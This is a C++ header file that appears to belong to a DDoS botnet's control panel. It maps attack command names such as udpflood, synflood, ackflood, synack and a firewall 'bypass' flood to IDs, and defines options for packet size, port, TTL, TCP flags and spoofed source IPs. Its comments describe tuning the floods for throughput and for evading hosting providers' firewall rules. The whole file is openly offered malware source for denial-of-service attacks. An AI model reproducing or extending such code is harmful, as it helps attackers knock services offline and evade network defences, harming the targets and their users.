#pragma once

#include <map>
#include <string>
#include <list>

#include "def.h"

struct command
{
    uint8_t *buf;
    uint32_t buf_len;
} PACKED;

struct process
{
    int fd;
    std::string buf;
    int buf_len;
    struct admin *ptr;
    int count;
    std::string f;
};

static std::map<std::string, uint8_t> flags =
{
    {"port", OPT_PORT},
    {"size", OPT_SIZE},
    {"path", OPT_HTTP_PATH},
    {"connection", OPT_HTTP_CONNECTION},
    {"domain", OPT_DOMAIN},
    {"ttl", OPT_TCP_TTL},
    {"source", OPT_TCP_SOURCE_PORT},
    {"ack", OPT_TCP_ACK},
    {"fin", OPT_TCP_FIN},
    {"urg", OPT_TCP_URG},
    {"psh", OPT_TCP_PSH},
    {"rst", OPT_TCP_RST},
    {"syn", OPT_TCP_SYN},
    {"tos", OPT_TCP_TOS},
    {"id", OPT_TCP_ID},
    {"sequence", OPT_TCP_SEQUENCE},
    {"source_ip", OPT_TCP_SOURCE_IP},
    {"ack_sequence", OPT_TCP_ACK_SEQUENCE}
};

static std::map<std::string, std::string> flag_description =
{
    {"port", "Port given to specify the destination port of the flood (default random)"},
    {"size", "Size of each request sent by the flood (default 900)"},
    {"path", "HTTP path (default /)"},
    {"connection", "HTTP connection type (default close)"},
    {"domain", "Desired domain to be resolved by the flood"},
    {"ttl", "IP header TTL (default 255)"},
    {"source", "TCP header source port (default random)"},
    {"ack", "ACK flag set in TCP header (default 1 depending on the flood type)"},
    {"fin", "FIN flag set in TCP header"},
    {"urg", "URG flag set in TCP header"},
    {"psh", "PSH flag set in TCP header"},
    {"rst", "RST flag set in TCP header"},
    {"syn", "SYN flag set in the TCP header (default 1 depending on the flood type)"},
    {"tos", "IP header TOS"},
    {"id", "IP header ID (default random)"},
    {"sequence", "TCP header sequence (default random)"},
    {"source_ip", "IP header source IP (255.255.255.255 for random)"},
    {"ack_sequence", "TCP header ACK sequence"}
};

static std::map<std::string, uint8_t> command_ids =
{
    {"udpflood", FLOOD_UDPFLOOD},
    {"synflood", FLOOD_SYNFLOOD},
    {"ackflood", FLOOD_ACKFLOOD},
    {"sockethold", FLOOD_TCPSOCKET},
    {"udpplain", FLOOD_UDPPLAIN},
    {"synplain", FLOOD_SYNPLAIN},
    {"ackplain", FLOOD_ACKPLAIN},
    {"synack", FLOOD_SYNACK},
    {"ackpsh", FLOOD_ACKPSH},
    {"bypass", FLOOD_BYPASS}
};

static std::map<std::string, std::list<uint8_t>> commands =
{
    {"sockethold", {OPT_TCP_SOURCE_IP, OPT_PORT}},
    {"udpflood", {OPT_PORT, OPT_SIZE}},
    {"udpplain", {OPT_PORT, OPT_SIZE}},
    {"bypass", {OPT_PORT, OPT_SIZE}},
    {"ackflood", {OPT_PORT, OPT_SIZE, OPT_TCP_TTL, OPT_TCP_SOURCE_PORT, OPT_TCP_ACK, OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN, OPT_TCP_TOS, OPT_TCP_ID, OPT_TCP_SEQUENCE, OPT_TCP_SOURCE_IP, OPT_TCP_ACK_SEQUENCE}},
    {"synflood", {OPT_PORT, OPT_SIZE, OPT_TCP_TTL, OPT_TCP_SOURCE_PORT, OPT_TCP_ACK, OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN, OPT_TCP_TOS, OPT_TCP_ID, OPT_TCP_SEQUENCE, OPT_TCP_SOURCE_IP, OPT_TCP_ACK_SEQUENCE}},
    {"synack", {OPT_PORT, OPT_SIZE, OPT_TCP_TTL, OPT_TCP_SOURCE_PORT, OPT_TCP_ACK, OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN, OPT_TCP_TOS, OPT_TCP_ID, OPT_TCP_SEQUENCE, OPT_TCP_SOURCE_IP, OPT_TCP_ACK_SEQUENCE}},
    {"ackplain", {OPT_PORT, OPT_SIZE, OPT_TCP_TTL, OPT_TCP_SOURCE_PORT, OPT_TCP_ACK, OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN, OPT_TCP_TOS, OPT_TCP_ID, OPT_TCP_SEQUENCE, OPT_TCP_SOURCE_IP, OPT_TCP_ACK_SEQUENCE}},
    {"synplain", {OPT_PORT, OPT_SIZE, OPT_TCP_TTL, OPT_TCP_SOURCE_PORT, OPT_TCP_ACK, OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN, OPT_TCP_TOS, OPT_TCP_ID, OPT_TCP_SEQUENCE, OPT_TCP_SOURCE_IP, OPT_TCP_ACK_SEQUENCE}},
    {"ackpsh", {OPT_PORT, OPT_SIZE, OPT_TCP_TTL, OPT_TCP_SOURCE_PORT, OPT_TCP_ACK, OPT_TCP_FIN, OPT_TCP_URG, OPT_TCP_PSH, OPT_TCP_RST, OPT_TCP_SYN, OPT_TCP_TOS, OPT_TCP_ID, OPT_TCP_SEQUENCE, OPT_TCP_SOURCE_IP, OPT_TCP_ACK_SEQUENCE}}
};

static std::map<std::string, std::string> command_description =
{
    {"gudp", "udp flood optimized for high gbps"},      // optimized for more gbps
    {"bypass", "udp flood optimized for bypass"},       // random header to bypass rules firewalls like ovh
    {"plain", "udp flood optimized for high gbps"},     // optimized for more pps
    {"pack", "ack flood optimized for high pps"},       // optimized for more pps
    {"psyn", "syn flood optimized for high pps"},       // optimized for more pps
    {"ackplain", "ack flood optimized for high pps"},   // optimized for more pps
    {"synplain", "syn flood optimized for high pps"},   // optimized for more pps
    {"synack", "syn-ack flood optimized for high pps"}, // optimized for more pps
    {"ackpsh", "ack-psh flood optimized for high pps"}, // optimized for more gbps
    {"sockethold", "hold sockets open"}                 // optimized for more gbps
};
